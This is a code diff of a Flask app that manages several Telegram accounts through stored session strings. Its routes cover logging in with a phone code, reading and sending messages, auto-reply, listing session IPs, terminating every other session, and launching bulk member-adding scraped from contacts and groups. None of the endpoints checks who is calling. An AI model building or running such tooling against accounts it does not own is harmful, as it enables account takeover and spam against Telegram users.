+                    loop = asyncio.new_event_loop()
+                    asyncio.set_event_loop(loop)
+                    loop.run_until_complete(client.get_me())
+                    loop.close()
+                    logger.info(f"✅ Connection alive for account {account_key}")
+                except Exception as e:
+                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
+            
+            logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
+        except Exception as e:
+            logger.error(f"Keep-alive error: {e}")
+        
+        time.sleep(240)  # 4 minutes
 
-# ==================== ROUTES - PAGES ====================
+# ==================== PAGE ROUTES ====================
 
 @app.route('/')
 def home():
@@ -598,48 +1627,37 @@ def all_sessions():
     return send_file('all.html')
 
 @app.route('/auto-add')
-def auto_add_page():
+def auto_add():
     return send_file('auto_add.html')
-
 @app.route('/settings')
-def settings_page():
+def settings():
     return send_file('settings.html')
-
 @app.route('/fog')
 def fog():
     return send_file('fog.html')
-
 # ==================== API ROUTES ====================
-
-@app.route('/api/health', methods=['GET'])
-def health_check():
-    return jsonify({
-        'status': 'healthy',
-        'accounts': len(accounts),
-        'auto_reply_active': len(active_clients),
-        'time': datetime.now().isoformat()
-    })
 
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
     formatted = []
     for acc in accounts:
         account_key = str(acc['id'])
+        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
         formatted.append({
             'id': acc.get('id'),
             'phone': acc.get('phone', ''),
             'name': acc.get('name', 'Unknown'),
-            'auto_reply_enabled': account_key in reply_settings and reply_settings[account_key].get('enabled', False),
-            'auto_add_enabled': account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False)
+            'auto_reply_enabled': has_reply
         })
     return jsonify({'success': True, 'accounts': formatted})
 
+# FIXED: Simplified add-account route with better error handling
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
     try:
         data = request.json
         if not data:
-            return jsonify({'success': False, 'error': 'No data received'})
+            return jsonify({'success': False, 'error': 'No JSON data received'})
         
         phone = data.get('phone')
         if not phone:
@@ -648,26 +1666,54 @@ def add_account():
         if not phone.startswith('+'):
             phone = '+' + phone
         
+        logger.info(f"Adding account for phone: {phone}")
+        
         async def send_code():
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            client = TelegramClient(
+                StringSession(), 
+                API_ID, 
+                API_HASH,
+                connection_retries=3,
+                retry_delay=1,
+                timeout=15
+            )
             try:
                 await client.connect()
+                logger.info(f"Connected to Telegram for {phone}")
+                
                 result = await client.send_code_request(phone)
-                session_id = str(int(time.time() * 1000))
+                logger.info(f"Code sent successfully to {phone}")
+                
+                session_id = str(int(time.time()))
                 temp_sessions[session_id] = {
                     'phone': phone,
                     'hash': result.phone_code_hash,
                     'session': client.session.save()
                 }
                 return {'success': True, 'session_id': session_id}
+                
+            except errors.FloodWaitError as e:
+                logger.warning(f"Flood wait for {phone}: {e.seconds}s")
+                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
+            except errors.PhoneNumberInvalidError:
+                return {'success': False, 'error': 'Invalid phone number'}
+            except errors.PhoneNumberBannedError:
+                return {'success': False, 'error': 'This phone number is banned'}
+            except (OSError, ConnectionError, TimeoutError) as e:
+                logger.error(f"Network error for {phone}: {e}")
+                return {'success': False, 'error': 'Network error. Cannot reach Telegram servers.'}
             except Exception as e:
+                logger.error(f"Unexpected error for {phone}: {e}")
                 return {'success': False, 'error': str(e)}
             finally:
                 await client.disconnect()
         
-        return jsonify(run_async(send_code()))
+        result = run_async(send_code())
+        return jsonify(result)
+        
     except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
+        logger.error(f"Error in add_account: {e}")
+        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})
 
 @app.route('/api/verify-code', methods=['POST'])
 def verify_code():
@@ -676,33 +1722,54 @@ def verify_code():
     session_id = data.get('session_id')
     password = data.get('password', '')
     
-    if not code or not session_id or session_id not in temp_sessions:
-        return jsonify({'success': False, 'error': 'Invalid session'})
+    if not code or not session_id:
+        return jsonify({'success': False, 'error': 'Missing code or session'})
+    
+    if session_id not in temp_sessions:
+        return jsonify({'success': False, 'error': 'Session expired'})
     
     session_data = temp_sessions[session_id]
     
     async def verify():
         client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
         await client.connect()
+        
         try:
             try:
-                await client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash'])
+                await client.sign_in(
+                    session_data['phone'], 
+                    code, 
+                    phone_code_hash=session_data['hash']
+                )
             except errors.SessionPasswordNeededError:
                 if not password:
                     return {'need_password': True}
                 await client.sign_in(password=password)
             
             me = await client.get_me()
-            new_id = max([a['id'] for a in accounts], default=0) + 1
             
-            accounts.append({
+            new_id = 1
+            if accounts:
+                new_id = max([a['id'] for a in accounts]) + 1
+            
+            new_account = {
                 'id': new_id,
                 'phone': me.phone or session_data['phone'],
                 'name': me.first_name or 'User',
                 'session': client.session.save()
-            })
-            save_json_file(ACCOUNTS_FILE, accounts)
+            }
+            
+            accounts.append(new_account)
+            save_accounts()
+            
             return {'success': True}
+            
+        except errors.PhoneCodeInvalidError:
+            return {'success': False, 'error': 'Invalid code'}
+        except errors.PhoneCodeExpiredError:
+            return {'success': False, 'error': 'Code expired'}
+        except errors.PasswordHashInvalidError:
+            return {'success': False, 'error': 'Invalid password'}
         except Exception as e:
             return {'success': False, 'error': str(e)}
         finally:
@@ -710,8 +1777,10 @@ def verify_code():
     
     try:
         result = run_async(verify())
+        
         if session_id in temp_sessions:
             del temp_sessions[session_id]
+        
         return jsonify(result)
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -721,32 +1790,70 @@ def get_messages():
     data = request.json
     account_id = data.get('accountId')
     
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
     account = next((acc for acc in accounts if acc['id'] == account_id), None)
+    
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
     
     async def fetch():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
+        
         try:
             if not await client.is_user_authorized():
-                remove_invalid_account(account_id)
-                return {'success': False, 'error': 'Session expired'}
+                return {'success': False, 'error': 'auth_key_unregistered'}
             
-            dialogs = await client.get_dialogs(limit=50)
+            dialogs = await client.get_dialogs()
+            
             chats = []
             for dialog in dialogs:
-                chats.append({
+                if not dialog:
+                    continue
+                
+                chat_type = 'user'
+                if dialog.is_group:
+                    chat_type = 'group'
+                elif dialog.is_channel:
+                    chat_type = 'channel'
+                
+                chat = {
                     'id': str(dialog.id),
                     'title': dialog.name or 'Unknown',
-                    'type': 'group' if dialog.is_group else 'channel' if dialog.is_channel else 'user',
-                    'unread': dialog.unread_count or 0
-                })
+                    'type': chat_type,
+                    'unread': dialog.unread_count or 0,
+                    'lastMessage': '',
+                    'lastMessageDate': 0
+                }
+                
+                if dialog.message:
+                    if dialog.message.text:
+                        chat['lastMessage'] = dialog.message.text[:50]
+                    elif dialog.message.media:
+                        chat['lastMessage'] = '📎 Media'
+                    
+                    if dialog.message.date:
+                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
+                
+                chats.append(chat)
+            
             return {'success': True, 'chats': chats}
+            
+        except AuthKeyUnregisteredError:
+            remove_invalid_account(account_id)
+            return {'success': False, 'error': 'auth_key_unregistered'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
     
-    return jsonify(run_async(fetch()))
+    try:
+        result = run_async(fetch())
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
@@ -755,24 +1862,43 @@ def send_message():
     chat_id = data.get('chatId')
     message = data.get('message')
     
-    if not all([account_id, chat_id, message]):
-        return jsonify({'success': False, 'error': 'Missing fields'})
+    if not account_id or not chat_id or not message:
+        return jsonify({'success': False, 'error': 'Missing required fields'})
     
     account = next((acc for acc in accounts if acc['id'] == account_id), None)
+    
     if not account:
         return jsonify({'success': False, 'error': 'Account not found'})
     
     async def send():
         client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
         await client.connect()
+        
         try:
-            entity = await client.get_entity(int(chat_id))
+            if not await client.is_user_authorized():
+                return {'success': False, 'error': 'auth_key_unregistered'}
+            
+            try:
+                entity = await client.get_entity(int(chat_id))
+            except:
+                try:
+                    entity = await client.get_entity(chat_id)
+                except:
+                    return {'success': False, 'error': 'Chat not found'}
+            
             await client.send_message(entity, message)
             return {'success': True}
+            
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
         finally:
             await client.disconnect()
     
-    return jsonify(run_async(send()))
+    try:
+        result = run_async(send())
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
@@ -782,19 +1908,32 @@ def remove_account():
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
     
+    global accounts
+    
     stop_auto_reply_for_account(account_id)
     
-    global accounts
+    original_len = len(accounts)
     accounts = [acc for acc in accounts if acc['id'] != account_id]
-    save_json_file(ACCOUNTS_FILE, accounts)
     
-    return jsonify({'success': True})
+    if len(accounts) < original_len:
+        save_accounts()
+        return jsonify({'success': True})
+    
+    return jsonify({'success': False, 'error': 'Account not found'})
 
 @app.route('/api/reply-settings', methods=['GET'])
 def get_reply_settings():
     account_id = request.args.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
     account_key = str(account_id)
-    settings = reply_settings.get(account_key, {'enabled': False})
+    settings = reply_settings.get(account_key, {
+        'enabled': False,
+        'chats': {}
+    })
+    
     return jsonify({'success': True, 'settings': settings})
 
 @app.route('/api/reply-settings', methods=['POST'])
@@ -802,266 +1941,268 @@ def update_reply_settings():
     data = request.json
     account_id = data.get('accountId')
     enabled = data.get('enabled', False)
+    chat_settings = data.get('chats', {})
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
     
     account_key = str(account_id)
-    was_enabled = reply_settings.get(account_key, {}).get('enabled', False)
     
     if account_key not in reply_settings:
         reply_settings[account_key] = {}
-    reply_settings[account_key]['enabled'] = enabled
-    save_json_file(REPLY_SETTINGS_FILE, reply_settings)
     
+    was_enabled = reply_settings[account_key].get('enabled', False)
+    reply_settings[account_key]['enabled'] = enabled
+    reply_settings[account_key]['chats'] = chat_settings
+    
+    save_reply_settings()
+    
+    # Start or stop based on new setting
     if enabled and not was_enabled:
         account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if account:
+        if account and account_key not in active_clients:
             thread = threading.Thread(
                 target=lambda: run_async(start_auto_reply_for_account(account)),
                 daemon=True
             )
             thread.start()
             client_tasks[account_key] = thread
-    elif not enabled:
+            logger.info(f"Started auto-reply for account {account_id}")
+    elif not enabled and was_enabled:
         stop_auto_reply_for_account(account_id)
     
-    return jsonify({'success': True})
+    return jsonify({'success': True, 'message': 'Settings updated'})
 
-# ==================== AUTO-ADD API ROUTES ====================
-
-@app.route('/api/auto-add-settings', methods=['GET'])
-def get_auto_add_settings():
-    account_id = request.args.get('accountId')
-    if not account_id:
-        return jsonify({'success': False, 'error': 'Account ID required'})
+@app.route('/api/toggle-chat-reply', methods=['POST'])
+def toggle_chat_reply():
+    data = request.json
+    account_id = data.get('accountId')
+    chat_id = data.get('chatId')
+    enabled = data.get('enabled', True)
+    
+    if not account_id or not chat_id:
+        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
     
     account_key = str(account_id)
     
-    default_settings = {
-        'enabled': False,
-        'target_group': 'Abe_armygroup',
-        'delay_seconds': 25,
-        'source_groups': ['@telegram', '@durov'],
-        'use_contacts': True,
-        'use_recent_chats': True,
-        'use_scraping': True,
-        'use_mutual_contacts': True,
-        'scrape_limit_per_group': 200,
-        'skip_bots': True,
-        'skip_inaccessible': True,
-        'auto_join': True,
-        'total_added': 0,
-        'added_today': 0,
-        'last_reset': datetime.now().strftime('%Y-%m-%d'),
-        'last_added': None
-    }
+    if account_key not in reply_settings:
+        reply_settings[account_key] = {'enabled': False, 'chats': {}}
     
-    if account_key not in auto_add_settings:
-        auto_add_settings[account_key] = default_settings
-        save_json_file(AUTO_ADD_FILE, auto_add_settings)
+    if 'chats' not in reply_settings[account_key]:
+        reply_settings[account_key]['chats'] = {}
     
-    settings = auto_add_settings[account_key]
-    for key, value in default_settings.items():
-        if key not in settings:
-            settings[key] = value
+    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
     
-    # Reset daily counter if needed
-    today = datetime.now().strftime('%Y-%m-%d')
-    if settings.get('last_reset') != today:
-        settings['added_today'] = 0
-        settings['last_reset'] = today
-        save_json_file(AUTO_ADD_FILE, auto_add_settings)
+    save_reply_settings()
     
-    return jsonify({'success': True, 'settings': settings})
+    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})
 
-@app.route('/api/auto-add-settings', methods=['POST'])
-def update_auto_add_settings():
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No data received'})
-        
-        account_id = data.get('accountId')
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        
-        account_key = str(account_id)
-        
-        if account_key not in auto_add_settings:
-            auto_add_settings[account_key] = {}
-        
-        was_enabled = auto_add_settings[account_key].get('enabled', False)
-        
-        auto_add_settings[account_key].update({
-            'enabled': data.get('enabled', False),
-            'target_group': data.get('target_group', 'Abe_armygroup'),
-            'delay_seconds': data.get('delay_seconds', 25),
-            'source_groups': data.get('source_groups', []),
-            'use_contacts': data.get('use_contacts', True),
-            'use_recent_chats': data.get('use_recent_chats', True),
-            'use_scraping': data.get('use_scraping', True),
-            'use_mutual_contacts': data.get('use_mutual_contacts', True),
-            'scrape_limit_per_group': data.get('scrape_limit_per_group', 200),
-            'skip_bots': data.get('skip_bots', True),
-            'skip_inaccessible': data.get('skip_inaccessible', True),
-            'auto_join': data.get('auto_join', True)
-        })
-        
-        if 'total_added' not in auto_add_settings[account_key]:
-            auto_add_settings[account_key]['total_added'] = 0
-        if 'added_today' not in auto_add_settings[account_key]:
-            auto_add_settings[account_key]['added_today'] = 0
-        
-        save_json_file(AUTO_ADD_FILE, auto_add_settings)
-        
-        # Start/stop auto-add
-        enabled = auto_add_settings[account_key]['enabled']
-        if enabled and not was_enabled:
-            account = next((acc for acc in accounts if acc['id'] == account_id), None)
-            if account:
-                thread = threading.Thread(
-                    target=lambda: run_async(professional_auto_add_loop(account)),
-                    daemon=True
-                )
-                thread.start()
-                client_tasks[f"auto_add_{account_key}"] = thread
-                logger.info(f"🚀 Started auto-add for account {account_id}")
-        
-        return jsonify({'success': True, 'message': 'Settings updated'})
-        
-    except Exception as e:
-        logger.error(f"Error updating auto-add settings: {e}")
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/auto-add-stats', methods=['GET'])
-def get_auto_add_stats():
+@app.route('/api/conversation-history', methods=['GET'])
+def get_conversation_history():
     account_id = request.args.get('accountId')
+    chat_id = request.args.get('chatId')
+    
+    if not account_id or not chat_id:
+        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
+    
+    account_key = str(account_id)
+    chat_key = str(chat_id)
+    
+    history = []
+    if account_key in conversation_history and chat_key in conversation_history[account_key]:
+        history = conversation_history[account_key][chat_key]
+    
+    return jsonify({'success': True, 'history': history})
+
+@app.route('/api/clear-history', methods=['POST'])
+def clear_conversation_history():
+    data = request.json
+    account_id = data.get('accountId')
+    chat_id = data.get('chatId')
+    
+    if not account_id or not chat_id:
+        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
+    
+    account_key = str(account_id)
+    chat_key = str(chat_id)
+    
+    if account_key in conversation_history and chat_key in conversation_history[account_key]:
+        conversation_history[account_key][chat_key] = []
+        save_conversation_history()
+    
+    return jsonify({'success': True, 'message': 'History cleared'})
+
+@app.route('/api/get-sessions', methods=['POST'])
+def get_sessions():
+    data = request.json
+    account_id = data.get('accountId')
+    
     if not account_id:
         return jsonify({'success': False, 'error': 'Account ID required'})
     
-    account_key = str(account_id)
-    settings = auto_add_settings.get(account_key, {})
+    account = next((acc for acc in accounts if acc['id'] == account_id), None)
     
-    return jsonify({
-        'success': True,
-        'added_today': settings.get('added_today', 0),
-        'total_added': settings.get('total_added', 0),
-        'enabled': settings.get('enabled', False),
-        'last_added': settings.get('last_added')
-    })
-
-@app.route('/api/test-auto-add', methods=['POST'])
-def test_auto_add():
-    """IMPORTANT: This route MUST return valid JSON"""
-    try:
-        data = request.json
-        if not data:
-            return jsonify({'success': False, 'error': 'No data received'})
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    async def get_sessions():
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        await client.connect()
         
-        account_id = data.get('accountId')
-        if not account_id:
-            return jsonify({'success': False, 'error': 'Account ID required'})
-        
-        account = next((acc for acc in accounts if acc['id'] == account_id), None)
-        if not account:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def test():
-            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
-            await client.connect()
+        try:
+            result = await client(functions.account.GetAuthorizationsRequest())
             
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Account not authorized. Please re-login.'}
-                
-                settings = auto_add_settings.get(str(account_id), {})
-                target_group = settings.get('target_group', 'Abe_armygroup')
-                
-                if not target_group.startswith('@'):
-                    target_group = '@' + target_group
-                
-                # Test target group
-                try:
-                    group = await client.get_entity(target_group)
-                    group_title = group.title if hasattr(group, 'title') else target_group
-                    
-                    # Count existing members
-                    member_count = 0
-                    async for _ in client.iter_participants(group, limit=1000):
-                        member_count += 1
-                except Exception as e:
-                    return {'success': False, 'error': f'Cannot access target group: {str(e)}'}
-                
-                # Count available members
-                available = 0
-                sources = []
-                
-                if settings.get('use_contacts', True):
-                    try:
-                        contacts = await client(functions.contacts.GetContactsRequest(0))
-                        available += len(contacts.users)
-                        sources.append(f"Contacts: {len(contacts.users)}")
-                    except:
-                        pass
-                
-                if settings.get('use_recent_chats', True):
-                    try:
-                        dialogs = await client.get_dialogs(limit=100)
-                        users = [d for d in dialogs if d.is_user]
-                        available += len(users)
-                        sources.append(f"Recent Chats: {len(users)}")
-                    except:
-                        pass
-                
-                return {
-                    'success': True,
-                    'group_found': True,
-                    'group_title': group_title,
-                    'existing_members': member_count,
-                    'available_members': available,
-                    'sources_found': sources,
-                    'can_add_members': available > 0
+            sessions = []
+            current_hash = None
+            
+            for auth in result.authorizations:
+                session_info = {
+                    'hash': auth.hash,
+                    'device_model': auth.device_model,
+                    'platform': auth.platform,
+                    'system_version': auth.system_version,
+                    'api_id': auth.api_id,
+                    'app_name': auth.app_name,
+                    'app_version': auth.app_version,
+                    'date_created': auth.date_created,
+                    'date_active': auth.date_active,
+                    'ip': auth.ip,
+                    'country': auth.country,
+                    'region': auth.region,
+                    'current': auth.current
                 }
                 
-            except Exception as e:
-                return {'success': False, 'error': str(e)}
-            finally:
-                await client.disconnect()
-        
-        result = run_async(test())
+                if auth.current:
+                    current_hash = auth.hash
+                
+                sessions.append(session_info)
+            
+            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
+            
+        except FreshResetAuthorisationForbiddenError:
+            return {'success': False, 'error': 'fresh_reset_forbidden'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+        finally:
+            await client.disconnect()
+    
+    try:
+        result = run_async(get_sessions())
         return jsonify(result)
-        
     except Exception as e:
-        logger.error(f"Test auto-add error: {traceback.format_exc()}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/terminate-session', methods=['POST'])
+def terminate_session():
+    data = request.json
+    account_id = data.get('accountId')
+    session_hash = data.get('hash')
+    
+    if not account_id or not session_hash:
+        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
+    
+    account = next((acc for acc in accounts if acc['id'] == account_id), None)
+    
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    async def terminate():
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        await client.connect()
+        
+        try:
+            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
+            return {'success': True}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+        finally:
+            await client.disconnect()
+    
+    try:
+        result = run_async(terminate())
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/terminate-sessions', methods=['POST'])
+def terminate_sessions():
+    data = request.json
+    account_id = data.get('accountId')
+    
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account = next((acc for acc in accounts if acc['id'] == account_id), None)
+    
+    if not account:
+        return jsonify({'success': False, 'error': 'Account not found'})
+    
+    async def terminate():
+        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+        await client.connect()
+        
+        try:
+            result = await client(functions.account.GetAuthorizationsRequest())
+            
+            current_hash = None
+            for auth in result.authorizations:
+                if auth.current:
+                    current_hash = auth.hash
+                    break
+            
+            count = 0
+            for auth in result.authorizations:
+                if auth.hash != current_hash:
+                    try:
+                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
+                        count += 1
+                    except:
+                        continue
+            
+            return {'success': True, 'message': f'Terminated {count} sessions'}
+            
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+        finally:
+            await client.disconnect()
+    
+    try:
+        result = run_async(terminate())
+        return jsonify(result)
+    except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/reconnect', methods=['GET'])
 def reconnect_all():
+    """Force reconnect all accounts"""
     for account_key in list(active_clients.keys()):
         stop_auto_reply_for_account(int(account_key))
+    
     time.sleep(2)
     start_all_auto_replies()
-    return jsonify({'success': True, 'active': len(active_clients)})
+    
+    return jsonify({
+        'success': True,
+        'message': 'Reconnecting all accounts',
+        'active': len(active_clients)
+    })
+
+@app.route('/api/health', methods=['GET'])
+def health_check():
+    return jsonify({
+        'status': 'healthy',
+        'accounts': len(accounts),
+        'auto_reply_active': len(active_clients),
+        'active_accounts': list(active_clients.keys()),
+        'time': datetime.now().isoformat()
+    })
 
 # ==================== STARTUP ====================
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    
-    print('\n' + '='*60)
-    print('🤖 TELEGRAM MULTI-ACCOUNT MANAGER')
-    print('='*60)
-    print(f'✅ Port: {port}')
-    print(f'✅ Accounts loaded: {len(accounts)}')
-    print(f'✅ Auto-reply settings: {len(reply_settings)}')
-    print(f'✅ Auto-add settings: {len(auto_add_settings)}')
-    print('='*60 + '\n')
-    
-    # Start keep-alive
-    threading.Thread(target=keep_alive, daemon=True).start()
-    
-    # Start auto-reply
-    threading.Thread(target=start_all_auto_replies, daemon=True).start()
-    
-    # Start auto-add for enabled accounts
+def start_auto_add_threads():
+    """Start auto-add for all enabled accounts after server starts"""
+    time.sleep(5)
+    logger.info("Checking for auto-add enabled accounts...")
     for account in accounts:
         account_key = str(account['id'])
         if account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False):
@@ -1070,5 +2211,27 @@ if __name__ == '__main__':
                 daemon=True
             )
             thread.start()
+            client_tasks[f"auto_add_{account_key}"] = thread
+            logger.info(f"Started auto-add for account {account.get('name')}")
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    
+    print('\n' + '='*70)
+    print('🤖 TELEGRAM MULTI-ACCOUNT MANAGER')
+    print('='*70)
+    print(f'✅ Port: {port}')
+    print(f'✅ Accounts loaded: {len(accounts)}')
+    print(f'✅ Auto-add settings loaded: {len(auto_add_settings)}')
+    print('='*70)
+    
+    # Start keep-alive
+    threading.Thread(target=keep_alive, daemon=True).start()
+    
+    # Start auto-reply
+    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
+    
+    # Start auto-add
+    threading.Thread(target=start_auto_add_threads, daemon=True).start()
     
     app.run(host='0.0.0.0', port=port, debug=False)
